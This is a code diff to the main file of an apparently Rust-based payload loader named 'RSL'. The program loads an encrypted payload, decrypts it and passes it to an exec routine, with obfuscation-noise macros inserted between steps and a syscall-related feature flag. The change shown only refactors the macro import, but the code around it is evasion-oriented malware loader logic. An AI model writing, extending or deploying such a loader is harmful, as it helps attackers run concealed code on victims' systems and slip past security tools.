@@ -16,6 +16,7 @@ use decode::decode_payload;
 use exec::exec;
 #[cfg(feature = "debug")]
 use utils::{print_error, print_message};
+use rsl_macros::obfuscation_noise_macro;
 
 fn exit_program() -> ! {
     #[cfg(feature = "veh_syscall")]
@@ -24,7 +25,7 @@ fn exit_program() -> ! {
 }
 
 fn start_program() {
-    rsl::obfuscation_noise_macro!();
+    obfuscation_noise_macro!();
     #[cfg(feature = "debug")]
     print_message("RSL started in debug mode.");
 
@@ -53,14 +54,14 @@ fn main() {
     } else {
         #[cfg(feature = "debug")] 
         print_message("Bundling succeeded.");
-        rsl::obfuscation_noise_macro!();
+        obfuscation_noise_macro!();
     }
 
     let encrypted_data = match load_payload() {
         Ok(data) => {
             #[cfg(feature = "debug")]
             print_message("Payload loaded successfully.");
-            rsl::obfuscation_noise_macro!();
+            obfuscation_noise_macro!();
             data
         },
         Err(_e) => {
@@ -77,7 +78,7 @@ fn main() {
             Ok(p) => {
                 #[cfg(feature = "debug")]
                 print_message("Payload decrypted successfully.");
-                rsl::obfuscation_noise_macro!();
+                obfuscation_noise_macro!();
                 p
             },
             Err(_e) => {
